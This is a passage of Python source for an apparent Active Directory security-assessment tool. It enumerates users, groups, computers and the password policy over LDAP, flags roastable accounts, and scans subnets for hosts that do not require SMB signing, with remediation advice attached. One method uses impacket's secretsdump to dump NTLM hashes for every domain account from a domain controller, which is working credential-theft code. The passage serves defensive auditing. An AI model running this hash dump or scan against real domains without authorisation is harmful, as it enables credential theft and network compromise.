# --- START OF FILE enumeration.py ---
import socket
import ipaddress
import traceback
from flask import json
import ldap3
import socket
import ipaddress
import concurrent.futures
import logging
from datetime import datetime, timedelta  # Ensure timedelta is imported
import uuid  # Needed for SMB checks
import random  # Needed for simulations
import subprocess  # Needed for running external commands
import re  # Needed for regex operations
import logging
import traceback
from impacket.dcerpc.v5 import transport, samr, lsad
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes

logger = logging.getLogger(__name__)

# Check if secretsdump is available
try:
    from impacket.dcerpc.v5 import transport, samr, lsad
    from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
    IMPACKET_SECRETSDUMP_AVAILABLE = True
except ImportError:
    IMPACKET_SECRETSDUMP_AVAILABLE = False
    logging.warning("impacket library (secretsdump) not found. NTDS.dit extraction will be skipped.")

# Set up logging
# Configure logging once, preferably not using basicConfig if part of a larger app
logger = logging.getLogger("ad_enum")

if not logger.handlers:  # Avoid adding handlers multiple times
    handler = logging.StreamHandler()
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(threadName)s - %(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)
logger.info(f"DEBUG: IMPACKET_SECRETSDUMP_AVAILABLE = {IMPACKET_SECRETSDUMP_AVAILABLE}")

class ADEnumerator:
    # Added selected_modules to init to control NTDS extraction
    def __init__(self, domain_name, dc_ip, username=None, password=None, selected_modules=None, target_subnets=None):
        self.domain_name = domain_name
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        # Store selected modules, defaulting to empty list
        self.selected_modules = selected_modules if isinstance(selected_modules, list) else []
        self.target_subnets = target_subnets if isinstance(target_subnets, list) else []
        self.server = None
        self.conn = None
        self.domain_dn = self._domain_to_dn(domain_name)
        self.netbios_domain = self._get_netbios_name(domain_name)
        self.results = {
            "status": "not_started",
            "domain": domain_name,
            "dc_ip": dc_ip,
            "findings": {
                "users_count": 0, "users": [],
                "computers_count": 0, "computers": [],
                "groups_count": 0, "groups": [],
                "domain_admins": [], "kerberoastable": [], "asrep_roastable": [],
                "smb_signing_disabled": [], "domain_trusts": [],
                "password_policy": None,
                "ntds_hashes": [],  # Key for NTDS.dit data
            },
            "vulnerabilities": [],
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "error": None,
        }
        logger.info(f"ADEnumerator initialized for {self.domain_name} with modules: {self.selected_modules}")

    def _domain_to_dn(self, domain):
        """Convert domain name to distinguished name format."""
        if not domain:
            return ""
        return ",".join([f"DC={part}" for part in domain.split(".")])

    def _get_netbios_name(self, domain):
        """Extracts the likely NetBIOS name (first part of FQDN)"""
        if not domain:
            return ""
        return domain.split(".")[0].upper()

    def connect(self):
        """Establish LDAP connection to the domain controller."""
        try:
            logger.info(f"Attempting to connect to LDAP server: {self.dc_ip}")
            self.server = ldap3.Server(self.dc_ip, get_info=ldap3.ALL, connect_timeout=10)

            if not self.username or not self.password:
                # --- Anonymous Bind ---
                logger.info("No credentials provided, attempting anonymous bind.")
                try:
                    self.conn = ldap3.Connection(self.server, auto_bind=True, authentication=ldap3.ANONYMOUS,
                                                 read_only=True, check_names=True, raise_exceptions=True)
                    # Test anonymous bind (optional)
                    try:
                        self.conn.search(self.server.info.root_dse["configurationNamingContext"][0],
                                         "(objectClass=*)", ldap3.BASE, attributes=["cn"])
                        logger.info(f"Anonymous bind to {self.dc_ip} appears successful.")
                    except ldap3.core.exceptions.LDAPAuthorizationDeniedResult:
                        logger.warning("Anonymous bind connected, but search operations likely denied.")
                    except Exception as test_e:
                        logger.warning(f"Post-anonymous bind test search failed: {test_e}. Operations might fail.")
                except (ldap3.core.exceptions.LDAPSocketOpenError, ldap3.core.exceptions.LDAPBindError) as anon_e:
                    logger.error(f"Anonymous LDAP connection/bind failed: {str(anon_e)}")
                    self.results["status"] = "error"
                    self.results["error"] = f"Anonymous connection failed: {str(anon_e)}"
                    return False
            else:
                # --- Authenticated Bind ---
                provided_username = self.username
                ntlm_username = None
                # Convert username format
                if "@" in provided_username:
                    parts = provided_username.split("@")
                    if len(parts) == 2:
                        ntlm_username = f"{self.netbios_domain}\\{parts[0]}"
                    else:
                        logger.warning(f"Potentially malformed UPN '{provided_username}'.")
                        ntlm_username = provided_username
                elif "\\" in provided_username:
                    ntlm_username = provided_username
                else:
                    ntlm_username = f"{self.netbios_domain}\\{provided_username}"
                logger.info(f"Attempting NTLM authenticated bind as '{ntlm_username}' to {self.dc_ip}")

                try:
                    self.conn = ldap3.Connection(self.server, user=ntlm_username, password=self.password,
                                                 authentication=ldap3.NTLM, auto_bind=True, read_only=True,
                                                 check_names=True, raise_exceptions=True)
                    logger.info(f"Authenticated NTLM bind as '{ntlm_username}' successful.")
                except ldap3.core.exceptions.LDAPBindError as e:
                    logger.error(f"LDAP NTLM bind failed for user '{ntlm_username}': {str(e)}")
                    self.results["status"] = "error"
                    msg = f"Authentication failed for '{ntlm_username}'. Check credentials/account status."
                    if "invalidCredentials" in str(e):
                        msg = f"Authentication failed for '{ntlm_username}': Invalid Credentials."
                    elif "accountDisabled" in str(e):
                        msg = f"Authentication failed for '{ntlm_username}': Account disabled."
                    elif "accountLocked" in str(e):
                        msg = f"Authentication failed for '{ntlm_username}': Account locked."
                    self.results["error"] = msg
                    return False
                except ldap3.core.exceptions.LDAPSocketOpenError as e:
                    logger.error(f"LDAP connection failed during NTLM attempt: Unable to connect to {self.dc_ip}. Error: {str(e)}")
                    self.results["status"] = "error"
                    self.results["error"] = f"Connection failed: Unable to reach {self.dc_ip} on LDAP port."
                    return False
                except Exception as conn_e:
                    logger.error(f"Unexpected error during NTLM connection: {str(conn_e)}\n{traceback.format_exc()}")
                    self.results["status"] = "error"
                    self.results["error"] = f"Unexpected NTLM connection error: {str(conn_e)}"
                    return False

            # Final connection check
            if not self.conn or not self.conn.bound:
                logger.error("Connection failed: Connection object invalid or not bound.")
                if self.results.get("status") != "error":
                    self.results["status"] = "error"
                    self.results["error"] = "Connection failed: Could not establish bound connection."
                return False

            self.results["error"] = None  # Clear error on success
            return True

        except Exception as e:
            logger.error(f"Unexpected error setting up LDAP connection: {str(e)}\n{traceback.format_exc()}")
            self.results["status"] = "error"
            self.results["error"] = f"Unexpected setup error: {str(e)}"
            return False

    def check_host_connectivity(self):
        """Test basic connectivity to the target host."""
        try:
            with socket.create_connection((self.dc_ip, 389), timeout=5):
                logger.info(f"Host {self.dc_ip} is reachable on LDAP port (389)")
                return True
        except (socket.timeout, socket.error) as e:
            logger.error(f"Host {self.dc_ip} is not reachable on LDAP port (389): {e}")
            self.results["status"] = "error"
            self.results["error"] = f"Cannot connect to {self.dc_ip} on LDAP port."
            return False
        except Exception as e:  # Catch other potential errors
            logger.error(f"Connectivity check failed unexpectedly: {str(e)}")
            self.results["status"] = "error"
            self.results["error"] = f"Connectivity check failed: {str(e)}"
            return False

    def enumerate_users(self):
        """Enumerate users and their properties."""
        if not self.conn or not self.conn.bound:
            logger.error("Cannot enumerate users: Not connected to LDAP.")
            self.results["error"] = "LDAP not connected."
            return False
        logger.info("Enumerating users")
        self.results["findings"]["users"] = []
        self.results["findings"]["kerberoastable"] = []
        self.results["findings"]["asrep_roastable"] = []

        search_filter = "(objectClass=user)"
        attributes = ["sAMAccountName", "userPrincipalName", "displayName", "memberOf",
                    "userAccountControl", "pwdLastSet", "servicePrincipalName",
                    "description", "distinguishedName", "objectSid", "lastLogonTimestamp"]
        try:
            entry_generator = self.conn.extend.standard.paged_search(
                search_base=self.domain_dn, search_filter=search_filter, search_scope=ldap3.SUBTREE,
                attributes=attributes, paged_size=500, generator=True)

            for entry in entry_generator:
                if 'dn' not in entry or 'attributes' not in entry:
                    continue
                attrs = entry['attributes']
                def get_attr(k, is_list=False):
                    v = attrs.get(k)
                    return v if is_list else (v[0] if isinstance(v, list) and v else (v if not isinstance(v, list) else None))

                sam = get_attr('sAMAccountName')
                if not sam:
                    logger.warning(f"Skipping user with missing sAMAccountName: DN={entry['dn']}")
                    continue

                # Convert pwdLastSet
                pwd_last_set = get_attr('pwdLastSet')
                logger.debug(f"Raw pwdLastSet for user {sam}: {pwd_last_set} (Type: {type(pwd_last_set)})")
                pwd_last_set_dt = None
                if pwd_last_set is not None:
                    try:
                        if isinstance(pwd_last_set, datetime):
                            # Ensure the datetime is offset-naive
                            pwd_last_set_dt = pwd_last_set.replace(tzinfo=None) if pwd_last_set.tzinfo else pwd_last_set
                        elif isinstance(pwd_last_set, (int, str)):
                            filetime = int(pwd_last_set)
                            if filetime == 0 or filetime == 9223372036854775807:  # Never set or max value
                                pwd_last_set_dt = None
                            else:
                                seconds_since_1601 = filetime / 10000000
                                unix_epoch = seconds_since_1601 - 11644473600
                                pwd_last_set_dt = datetime.fromtimestamp(unix_epoch)
                    except (ValueError, TypeError, OSError) as e:
                        logger.warning(f"Failed to convert pwdLastSet for user {sam}: {e}")

                # Compute password age
                password_age_days = None
                if pwd_last_set_dt:
                    # datetime.now() is naive, so pwd_last_set_dt must also be naive
                    password_age_days = (datetime.now() - pwd_last_set_dt).days

                # Convert lastLogonTimestamp
                last_logon = get_attr('lastLogonTimestamp')
                logger.debug(f"Raw lastLogonTimestamp for user {sam}: {last_logon} (Type: {type(last_logon)})")
                last_logon_dt = None
                if last_logon is not None:
                    try:
                        if isinstance(last_logon, datetime):
                            # Ensure the datetime is offset-naive
                            last_logon_dt = last_logon.replace(tzinfo=None) if last_logon.tzinfo else last_logon
                        elif isinstance(last_logon, (int, str)):
                            filetime = int(last_logon)
                            if filetime == 0 or filetime == 9223372036854775807:  # Never set or max value
                                last_logon_dt = None
                            else:
                                seconds_since_1601 = filetime / 10000000
                                unix_epoch = seconds_since_1601 - 11644473600
                                last_logon_dt = datetime.fromtimestamp(unix_epoch)
                    except (ValueError, TypeError, OSError) as e:
                        logger.warning(f"Failed to convert lastLogonTimestamp for user {sam}: {e}")

                # Parse userAccountControl
                uac = get_attr('userAccountControl')
                account_status = 'Unknown'
                if uac:
                    try:
                        uac_int = int(uac)
                        account_status = 'Enabled'
                        if uac_int & 0x2:  # ACCOUNTDISABLE
                            account_status = 'Disabled'
                        if uac_int & 0x10:  # LOCKOUT
                            account_status = 'Locked'
                    except ValueError:
                        logger.warning(f"Invalid UAC '{uac}' for user {sam}")

                user = {
                    "samAccountName": sam,
                    "userPrincipalName": get_attr('userPrincipalName'),
                    "displayName": get_attr('displayName'),
                    "memberOf": get_attr('memberOf', True),
                    "description": get_attr('description'),
                    "distinguishedName": entry['dn'],
                    "objectSid": get_attr('objectSid'),
                    "pwdLastSet": pwd_last_set_dt.isoformat() if pwd_last_set_dt else None,
                    "passwordAgeDays": password_age_days,
                    "passwordExpired": None,  # Will compute later
                    "lastLogonTimestamp": last_logon_dt.isoformat() if last_logon_dt else None,
                    "accountStatus": account_status
                }

                spns = get_attr('servicePrincipalName', True)
                if spns:
                    user["servicePrincipalName"] = spns
                    self.results["findings"]["kerberoastable"].append(sam)

                if uac:
                    try:
                        if int(uac) & 0x00400000:  # DONT_REQUIRE_PREAUTH
                            self.results["findings"]["asrep_roastable"].append(sam)
                    except ValueError:
                        logger.warning(f"Invalid UAC '{uac}' for user {sam}")

                self.results["findings"]["users"].append(user)

            self.results["findings"]["users_count"] = len(self.results["findings"]["users"])

            # Add Vulnerability Findings (unchanged)
            if self.results["findings"]["kerberoastable"]:
                self._add_vuln_finding("Kerberoastable Accounts", "High", self.results["findings"]["kerberoastable"],
                                    "Accounts with SPNs found.", "Use strong passwords/gMSAs.",
                                    ["Identify accounts.", "Use strong passwords (>25 chars).", "Rotate passwords.",
                                        "Consider gMSAs.", "Monitor TGS-REQ (4769)."],
                                    [{"title": "MITRE T1558.003", "url": "https://attack.mitre.org/techniques/T1558/003/"},
                                        {"title": "ADSecurity", "url": "https://adsecurity.org/?p=2293"}])
            if self.results["findings"]["asrep_roastable"]:
                self._add_vuln_finding("AS-REP Roastable Accounts", "Medium", self.results["findings"]["asrep_roastable"],
                                    "Accounts with pre-auth disabled found.", "Enable pre-auth.",
                                    ["Identify accounts.", "Enable pre-auth (Set-ADUser ... -DoesNotRequirePreAuth $false).",
                                        "Use strong passwords if disabled.", "Audit regularly."],
                                    [{"title": "MITRE T1558.004", "url": "https://attack.mitre.org/techniques/T1558/004/"},
                                        {"title": "Harmj0y", "url": "https://blog.harmj0y.net/redteaming/roasting-as-reps/"}])

            logger.info(f"Found {self.results['findings']['users_count']} users")
            return True
        except ldap3.core.exceptions.LDAPException as e:
            logger.error(f"User enum LDAP error: {e}")
            self.results["error"] = f"User enum failed: {e}"
            return False
        except Exception as e:
            logger.error(f"User enum processing error: {e}\n{traceback.format_exc()}")
            self.results["error"] = f"User enum error: {e}"
            return False

    def enumerate_password_policy(self):
        """Enumerate domain password policy and analyze user password data."""
        if not self.conn or not self.conn.bound:
            logger.error("Cannot enumerate password policy: Not connected.")
            self.results["error"] = "LDAP not connected."
            return False
        logger.info("Enumerating password policy")
        try:
            search_filter = "(objectClass=domain)"
            attributes = ["minPwdLength", "pwdHistoryLength", "maxPwdAge", "minPwdAge",
                        "lockoutThreshold", "lockoutDuration", "lockOutObservationWindow", "pwdProperties"]
            self.conn.search(self.domain_dn, search_filter, search_scope=ldap3.BASE, attributes=attributes)
            if not self.conn.entries:
                logger.error("Could not find domain object.")
                self.results["error"] = "Could not find domain object."
                return False

            entry = self.conn.entries[0]
            def ad_interval_to_days(v):
                if v is None:
                    return 0
                if isinstance(v, timedelta):
                    return abs(v.days + v.seconds / 86400.0)
                if isinstance(v, int):
                    if v == -9223372036854775808:
                        return -1
                    return 0 if v == 0 else abs(v / 864000000000.0)
                logger.warning(f"Unexpected type for AD interval: {type(v)}")
                return 0

            def get_policy_attr(attr_name):
                return getattr(entry, attr_name).value if hasattr(entry, attr_name) else None

            max_pwd_age_days = ad_interval_to_days(get_policy_attr("maxPwdAge"))
            policy = {
                "min_length": get_policy_attr("minPwdLength") or 0,
                "password_history": get_policy_attr("pwdHistoryLength") or 0,
                "max_age": max_pwd_age_days,
                "min_age": ad_interval_to_days(get_policy_attr("minPwdAge")),
                "lockout_threshold": get_policy_attr("lockoutThreshold") or 0,
                "complexity": bool(get_policy_attr("pwdProperties") & 1) if get_policy_attr("pwdProperties") else False,
                "issues": [],
                "strength_counts": {"very_weak": 0, "weak": 0, "medium": 0, "strong": 0, "very_strong": 0},
                "user_password_stats": []  # New field for user-specific password data
            }

            # Policy Checks (unchanged)
            min_len_rec, hist_rec, max_age_rec, lockout_rec = 12, 24, 60, 5
            if policy["min_length"] < min_len_rec:
                policy["issues"].append(f"Min length ({policy['min_length']}) < recommended ({min_len_rec}).")
            if policy["password_history"] < hist_rec:
                policy["issues"].append(f"History ({policy['password_history']}) < recommended ({hist_rec}).")
            if policy["max_age"] == -1:
                policy["issues"].append("Max age is 'Never Expire'.")
            elif policy["max_age"] == 0:
                policy["issues"].append("Max age policy not configured.")
            elif policy["max_age"] > max_age_rec:
                policy["issues"].append(f"Max age ({int(policy['max_age'])}d) > recommended ({max_age_rec}d).")
            if policy["min_age"] < 1 and policy["min_age"] != 0:
                policy["issues"].append(f"Min age ({policy['min_age']}d) < 1 day.")
            if not policy["complexity"]:
                policy["issues"].append("Password complexity disabled.")
            if policy["lockout_threshold"] == 0:
                policy["issues"].append("Lockout threshold disabled (0).")
            elif policy["lockout_threshold"] > lockout_rec:
                policy["issues"].append(f"Lockout threshold ({policy['lockout_threshold']}) > recommended ({lockout_rec}).")

            # Analyze user password data
            for user in self.results["findings"]["users"]:
                pwd_age = user.get("passwordAgeDays")
                pwd_last_set = user.get("pwdLastSet")
                account_status = user.get("accountStatus", "Unknown")
                sam = user.get("samAccountName")

                # Compute expiration status
                expired = None
                if pwd_age is not None and max_pwd_age_days > 0:
                    expired = pwd_age > max_pwd_age_days
                    user["passwordExpired"] = expired

                # Estimate password strength (basic heuristic)
                strength = "unknown"
                if pwd_age is not None:
                    if pwd_age > 365:
                        strength = "very_weak"
                        policy["strength_counts"]["very_weak"] += 1
                    elif pwd_age > 180:
                        strength = "weak"
                        policy["strength_counts"]["weak"] += 1
                    elif pwd_age > 90:
                        strength = "medium"
                        policy["strength_counts"]["medium"] += 1
                    elif pwd_age > 30:
                        strength = "strong"
                        policy["strength_counts"]["strong"] += 1
                    else:
                        strength = "very_strong"
                        policy["strength_counts"]["very_strong"] += 1

                policy["user_password_stats"].append({
                    "samAccountName": sam,
                    "passwordAgeDays": pwd_age,
                    "pwdLastSet": pwd_last_set,
                    "passwordExpired": expired,
                    "accountStatus": account_status,
                    "passwordStrength": strength
                })

            self.results["findings"]["password_policy"] = policy
            logger.info(f"Password policy enum completed. Issues: {len(policy['issues'])}")
            return True
        except ldap3.core.exceptions.LDAPException as e:
            logger.error(f"Pwd policy LDAP error: {e}")
            self.results["error"] = f"Pwd policy failed: {e}"
            return False
        except Exception as e:
            logger.error(f"Pwd policy processing error: {e}\n{traceback.format_exc()}")
            self.results["error"] = f"Pwd policy error: {e}"
            return False

    def enumerate_groups(self):
        """Enumerate groups and their memberships."""
        if not self.conn or not self.conn.bound:
            logger.error("Cannot enumerate groups: Not connected.")
            self.results["error"] = "LDAP not connected."
            return False
        logger.info("Enumerating groups")
        self.results["findings"]["groups"] = []
        self.results["findings"]["domain_admins"] = []
        self.results["findings"]["privileged_users"] = []  # New field for privileged users
        search_filter = "(objectClass=group)"
        attributes = ["sAMAccountName", "member", "description", "whenCreated", "distinguishedName", "objectSid"]
        try:
            entry_generator = self.conn.extend.standard.paged_search(
                search_base=self.domain_dn, search_filter=search_filter, search_scope=ldap3.SUBTREE,
                attributes=attributes, paged_size=500, generator=True)
            groups_found = 0
            for entry in entry_generator:
                if 'dn' not in entry or 'attributes' not in entry:
                    continue
                attrs = entry['attributes']
                def get_attr(k, is_list=False):
                    v = attrs.get(k)
                    return v if is_list else (v[0] if isinstance(v, list) and v else (v if not isinstance(v, list) else None))

                sam = get_attr('sAMAccountName')
                name = sam or entry['dn'].split(',')[0].replace('CN=', '')  # Fallback name
                if not sam:
                    logger.warning(f"Group missing sAMAccountName: DN={entry['dn']}. Using CN.")

                members = get_attr('member', True)
                group = {
                    "sAMAccountName": sam,
                    "name": name,
                    "description": get_attr('description'),
                    "whenCreated": get_attr('whenCreated'),
                    "distinguishedName": entry['dn'],
                    "objectSid": get_attr('objectSid'),
                    "members": members,
                    "is_privileged": sam in ["Domain Admins", "Enterprise Admins", "Administrators"]  # Expand as needed
                }
                self.results["findings"]["groups"].append(group)
                groups_found += 1
                if sam == "Domain Admins":
                    self.results["findings"]["domain_admins"] = members
                    # Identify privileged users
                    for member_dn in members:
                        for user in self.results["findings"]["users"]:
                            if user["distinguishedName"] == member_dn:
                                self.results["findings"]["privileged_users"].append({
                                    "samAccountName": user["samAccountName"],
                                    "distinguishedName": user["distinguishedName"],
                                    "group": "Domain Admins"
                                })

            self.results["findings"]["groups_count"] = groups_found
            logger.info(f"Found {groups_found} groups")
            return True
        except ldap3.core.exceptions.LDAPException as e:
            logger.error(f"Group enum LDAP error: {e}")
            self.results["error"] = f"Group enum failed: {e}"
            return False
        except Exception as e:
            logger.error(f"Group enum processing error: {e}\n{traceback.format_exc()}")
            self.results["error"] = f"Group enum error: {e}"
            return False

    def enumerate_computers(self):
        """Enumerate computer objects and their properties."""
        if not self.conn or not self.conn.bound:
            logger.error("Cannot enumerate computers: Not connected.")
            self.results["error"] = "LDAP not connected."
            return False
        logger.info("Enumerating computers")
        self.results["findings"]["computers"] = []
        search_filter = "(objectClass=computer)"
        attributes = ["sAMAccountName", "dnsHostName", "operatingSystem",
                      "operatingSystemServicePack", "whenCreated",
                      "lastLogonTimestamp", "objectSid", "description"]
        try:
            entry_generator = self.conn.extend.standard.paged_search(
                search_base=self.domain_dn, search_filter=search_filter, search_scope=ldap3.SUBTREE,
                attributes=attributes, paged_size=100, generator=True)
            computers_found = 0
            for entry in entry_generator:
                if 'dn' not in entry or 'attributes' not in entry:
                    continue
                attrs = entry['attributes']
                def get_attr(k):
                    v = attrs.get(k)
                    return v[0] if isinstance(v, list) and v else (v if not isinstance(v, list) else None)

                sam = get_attr('sAMAccountName')
                if not sam:
                    logger.warning(f"Skipping computer with missing sAMAccountName: DN={entry['dn']}")
                    continue

                computer = {"samAccountName": sam, "dnsHostName": get_attr('dnsHostName'),
                            "operatingSystem": get_attr('operatingSystem'),
                            "operatingSystemServicePack": get_attr('operatingSystemServicePack'),
                            "whenCreated": get_attr('whenCreated'),
                            "lastLogonTimestamp": get_attr('lastLogonTimestamp'),  # Needs conversion
                            "distinguishedName": entry['dn'], "objectSid": get_attr('objectSid'),
                            "description": get_attr('description')}
                self.results["findings"]["computers"].append(computer)
                computers_found += 1

            self.results["findings"]["computers_count"] = computers_found
            logger.info(f"Found {computers_found} computers")
            return True
        except ldap3.core.exceptions.LDAPException as e:
            logger.error(f"Computer enum LDAP error: {e}")
            self.results["error"] = f"Computer enum failed: {e}"
            return False
        except Exception as e:
            logger.error(f"Computer enum processing error: {e}\n{traceback.format_exc()}")
            self.results["error"] = f"Computer enum error: {e}"
            return False

    def extract_ntds_dit(self):
        if not IMPACKET_SECRETSDUMP_AVAILABLE:
            logger.error("Impacket secretsdump not available. Cannot extract NTDS.dit.")
            self.results["error"] = "Required library (impacket) not installed for NTDS dump."
            return False
        if not self.username or not self.password:
            logger.error("NTDS.dit extraction requires authenticated credentials.")
            self.results["error"] = "Credentials required for NTDS.dit extraction."
            return False

        logger.info(f"Attempting to extract NTDS.dit from {self.dc_ip}")
        try:
            # Initialize SMB connection
            # Handle username with or without domain prefix (e.g., "ZAYD\Administrator" or "Administrator")
            username = self.username
            domain= self.domain_name
            if '@' in username:
                username, domain_part = username.split('@', 1)
                domain = domain or domain_part
            elif '\\' in username:
                domain_part, username = username.split('\\', 1)
            domain = domain or domain_part
            domain = self.domain_name or (self.username.split('\\')[0] if '\\' in self.username else '')

            smb_connection = transport.SMBTransport(
                remoteName=self.dc_ip,
                remote_host=self.dc_ip,
                dstport=445,
                username=username,
                password=self.password,
                domain=domain
            )
            logger.info(f"Connecting to SMB share on {self.dc_ip} as {username}...")
            smb_connection.connect()

            # Initialize RemoteOperations
            remote_ops = RemoteOperations(
                smbConnection=smb_connection.get_smb_connection(),
                doKerberos=False,
                kdcHost=None
            )

            # Callback to capture NTLM hashes
            ntlm_hashes = []
            def hash_callback(secret_type, secret):
                if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
                    # Parse the hash output: domain\username:rid:lmhash:nthash:::
                    parts = secret.split(':')
                    if len(parts) >= 4:
                        # Username field may include domain (e.g., "Zayd.com\Zayd" or "Administrator")
                        username = parts[0]
                        ntlm_hash = parts[3]
                        # Normalize domain format (replace "Zayd.com" with "ZAYD" for consistency)
                        if domain and domain.lower() in username.lower():
                            username = username.replace(f"{domain}.", domain, 1).replace(".", "\\")
                        ntlm_hashes.append({
                            "username": username,
                            "ntlm_hash": ntlm_hash
                        })

            # Initialize NTDSHashes for DRSUAPI method
            ntds_dumper = NTDSHashes(
                ntdsFile=None,
                bootKey=None,
                isRemote=True,
                remoteOps=remote_ops,
                perSecretCallback=hash_callback,
                justNTLM=True,
                printUserStatus=True,
                pwdLastSet=True,
                history=False
            )

            # Perform the dump
            ntds_dumper.dump()

            # Store results
            self.results["findings"]["ntds_hashes"] = ntlm_hashes
            logger.info(f"Successfully retrieved {len(ntlm_hashes)} NTLM hashes.")

            # Cleanup
            ntds_dumper.finish()
            remote_ops.finish()
            smb_connection.disconnect()

            return True
        except Exception as e:
            logger.error(f"Failed to extract/process NTDS.dit: {str(e)}\n{traceback.format_exc()}")
            self.results["error"] = f"NTDS.dit extraction failed: {str(e)}"
            return False
        
    def _scan_port(self, ip, port, timeout=0.5):
        """Quickly checks if a TCP port is open on an IP."""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            return result == 0  # Port is open if connect_ex returns 0
        except socket.error as e:
            # Log specific errors if needed, but generally ignore for scanning
            # logger.info(f"Socket error scanning {ip}:{port} - {e}")
            return False
        finally:
            if sock:
                sock.close()


    def check_smb_signing(self):
        """
        Check if SMB signing is required on hosts using Impacket.
        Returns True if check completes (even with warnings), False if fatal error occurs.
        """
        logger.info("Checking SMB signing using Impacket...")
        
        # First, ensure Impacket is installed
        try:
            from impacket.smbconnection import SMBConnection
            from impacket.smb import SMB_DIALECT
        except ImportError:
            logger.error("Impacket library not installed. Install with: pip install impacket")
            self._add_info_finding(
                "SMB Signing Check Skipped", 
                "Impacket library not found. Install Impacket to enable SMB signing checks.",
                remediation="Install Impacket: pip install impacket"
            )
            return True  # Allow process to continue
        
        # Get hosts to scan
        hosts_to_scan = self._get_smb_hosts_to_scan()
        if not hosts_to_scan:
            logger.warning("No hosts found with port 445 open in target subnets/DC.")
            return True
        
        # Print hosts to scan for debugging
        logger.info(f"Hosts to scan for SMB signing: {', '.join(hosts_to_scan)}")
        
        # Scan hosts for SMB signing
        vulnerable_hosts = self._check_smb_signing_with_impacket(hosts_to_scan)
        if vulnerable_hosts is None:  # Indicates error in scanning
            return False
        
        # Record findings
        self.results["findings"]["smb_signing_disabled"] = vulnerable_hosts
        if vulnerable_hosts:
            self._add_vuln_finding(
                "SMB Signing Not Required", 
                "Medium", 
                vulnerable_hosts,
                f"Found {len(vulnerable_hosts)} hosts where SMB signing is not required.",
                "Require SMB signing via Group Policy.",
                [
                    "Open Group Policy Management Console (GPMC).",
                    "Edit or create a GPO for domain controllers and/or member servers.",
                    "Navigate to Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options.",
                    "Enable 'Microsoft network client: Digitally sign communications (always)'.",
                    "Enable 'Microsoft network server: Digitally sign communications (always)'.",
                    "Apply the GPO to appropriate OUs.",
                    "Run 'gpupdate /force' on target systems or wait for GPO refresh."
                ],
                [
                    {"title": "Microsoft Docs: SMB Signing", "url": "https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing"},
                    {"title": "MITRE ATT&CK T1557.001", "url": "https://attack.mitre.org/techniques/T1557/001/"}
                ],
                "Misconfiguration"
            )
        
        logger.info(f"Completed SMB signing check via Impacket. Found {len(vulnerable_hosts)} hosts not requiring signing.")
        return True

    def _get_smb_hosts_to_scan(self):
        """Identify hosts with port 445 open to scan for SMB signing."""
        logger.info("Scanning target subnets for hosts with port 445 open...")
        
        # Validate LDAP connection if needed for gathering information
        if hasattr(self, 'require_ldap') and self.require_ldap and (not self.conn or not self.conn.bound):
            logger.error("Cannot check SMB signing: Not connected to LDAP for initial info.")
            self.results["error"] = "LDAP not connected."
            return []
            
        # Get target subnets to scan
        target_subnets = getattr(self, 'target_subnets', [])
        hosts_to_scan = []
        
        # If no subnets, just check the DC
        if not target_subnets:
            logger.warning("No target subnets provided. Checking only DC if available.")
            if hasattr(self, 'dc_ip') and self.dc_ip:
                # Test if DC has port 445 open
                if self._scan_port(self.dc_ip, 445):
                    hosts_to_scan = [self.dc_ip]
            return hosts_to_scan
                
        # Process and scan each subnet in parallel
        logger.info(f"Target subnets for scan: {target_subnets}")
        valid_ips = []
        
        # Convert subnet strings to IP addresses
        for subnet_str in target_subnets:
            try:
                import ipaddress
                network = ipaddress.ip_network(subnet_str, strict=False)
                # Limit very large subnets to avoid excessive scanning
                if network.num_addresses > 1024:  # Set a reasonable limit
                    logger.warning(f"Subnet {subnet_str} is very large. Limiting to first 1024 IPs.")
                    valid_ips.extend([str(ip) for ip in list(network.hosts())[:1024]])
                else:
                    valid_ips.extend([str(ip) for ip in network.hosts()])
            except ValueError:
                logger.error(f"Invalid subnet format '{subnet_str}'. Skipping.")
                continue
        
        # Scan ports in parallel with rate limiting
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            future_to_ip = {executor.submit(self._scan_port, ip, 445): ip for ip in valid_ips}
            
            for future in concurrent.futures.as_completed(future_to_ip):
                ip = future_to_ip[future]
                try:
                    if future.result():
                        hosts_to_scan.append(ip)
                except Exception as exc:
                    logger.error(f"Error scanning port 445 for {ip}: {exc}")
        
        logger.info(f"Found {len(hosts_to_scan)} hosts with port 445 open for SMB signing check.")
        return hosts_to_scan

    def _scan_port(self, ip, port, timeout=1):
        """
        Check if a specific port is open on a target IP.
        Returns True if port is open, False otherwise.
        """
        import socket
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                result = s.connect_ex((ip, port))
                return result == 0
        except (socket.gaierror, socket.error) as e:
            logger.debug(f"Error scanning {ip}:{port} - {str(e)}")
            return False

    def _check_smb_signing_with_impacket(self, hosts_to_scan):
        """
        Check SMB signing requirements on hosts using Impacket.
        Returns a list of vulnerable hosts, or None if there was an error.
        """
        from impacket.smbconnection import SMBConnection
        from impacket.smb import SMB_DIALECT
        import concurrent.futures
        
        vulnerable_hosts = []
        checked_hosts = 0
        
        def check_host_signing(host):
            nonlocal checked_hosts
            status = {
                "host": host,
                "vulnerable": False,
                "error": None,
                "signing_required": None,
                "auth_tried": False
            }
            
            try:
                # Set up a timeout for the connection
                from socket import timeout
                
                # Try to connect to the host without credentials first (anonymous)
                try:
                    logger.info(f"Attempting anonymous SMB connection to {host}")
                    conn = SMBConnection(host, host, timeout=5)
                    
                    # Check if signing is required
                    # When SMB signing is not required, isSigningRequired will be False
                    signing_required = conn.getDialect() != SMB_DIALECT and conn.isSigningRequired()
                    status["signing_required"] = signing_required
                    
                    # Log dialect information
                    logger.info(f"Host {host} - SMB dialect: {conn.getDialect()}, Signing required: {signing_required}")
                    
                    # Close the connection
                    conn.close()
                    
                    if not signing_required:
                        logger.warning(f"Host {host} does not require SMB signing (anonymous check)")
